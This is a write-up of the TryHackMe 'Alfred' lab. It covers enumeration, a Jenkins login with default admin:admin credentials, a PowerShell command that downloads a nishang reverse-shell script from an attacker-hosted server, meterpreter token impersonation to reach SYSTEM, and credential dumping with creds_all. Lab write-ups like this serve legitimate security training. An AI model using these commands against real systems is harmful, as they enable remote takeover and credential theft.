# Alfred \(W\) \(wlk\)

_TryHackMe_ – [**Alfred**](https://tryhackme.com/room/alfred) Write-Up

_topics_: web application attacks, active info gathering, powershell, Windows privilege escalation \(authentication tokens\), jenkins web server

1. **Plan**
2. **Enumeration**
3. **Local Privilege Escalation**
4. **Exploitation \(Root PrivEsc\)**

new tools: nmapautomater

#### USE WITHOUT METASPLOIT

## 1\) Plan

## 2\) Enum

initial enum with `nmap -vvv <ip>` _or_ `./nmapAutomator.sh <ip> Basic` returns 3 open ports \(http, ms-wbt-server and http-proxy \(80, 3389, 8080\)\)

- we are tasked with finding a username:password for the login panel. There is no login on the initial URL so we must try the URL on one of its open ports, 80, 3389 or **8080**. Navigating to port 8080 and using default creds \(admin:admin\) work :D

## 3\) Local Privilege Escalation

we need to find a way to execute commands on the webserver. This can only be achieved on the website itself \(there are several CVEs that demonstrate potential ACE but not for the purposes of this run through\).

**The desired privesc on the walkthrough did not work at all, so I used metasploit to launch meterpreter.**

The desired walkthrough through powershell invoking a reverse tcp shell from Jenkins server back to attacker by command `powershell iex (New-Object Net.WebClient).DownloadString('http://your-ip:your-port/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port` by setting up a HTTP server and having the invoke shell from nishang. Everything was configured properly the machine did not correctly build the command from inside the website, as it was displayed by the instructor and several walkthroughs. Nothing was changed so idk really. Following this is when you switch and upgrade shell to meterpreter by loading msfvenom and calling it from powershell on the victim machine. Useful commands for meterpreter include:

`getuid`

`shell`

`execute -f cmd.exe -i -H (if above fails)`

The process to root is the same from this point.

## 4\) Exploitation \(Root\)

The act of transitioning to root on this box is done by token impersonation of the svchost.exe service. This means several things.

Windows uses tokens to ensure that accounts have the right privileges to carry out particular actions. Account tokens are assigned to an account when users log in or are authenticated. This is usually done by LSASS.exe\(think of this as an authentication process\). The token consists of user SIDs \(security ID\), group SIDs and privileges. There are two types of access tokens:

* primary access tokens: those associated with a user account that are generated on log on
* impersonation tokens: these allow a particular process\(or thread in a process\) to gain access to resources using the token of another \(user/client\) process

basically windows SUID files. View all the privileges using whoami /priv

There are many processes that are running with svchost as NT AUTHORITY\SYSTEM. Svchost is a **shell** that is loaded from a executable file is used to host these DLL services. It is the main host from which all logical service groups are branched from.

To check which tokens are available, enter the _list\_tokens -g_. We can see that the _BUILTIN\Administrators_ token is available. Use the _impersonate\_token "BUILTIN\Administrators"_ command to impersonate the Administrators token

ps to view which processes are root. Migrate to svchost.exe or services.exe which is owned by nt authority\system. Create shell and have root privileges.

5\) Post Exploitation

creds\_all in meterpreter



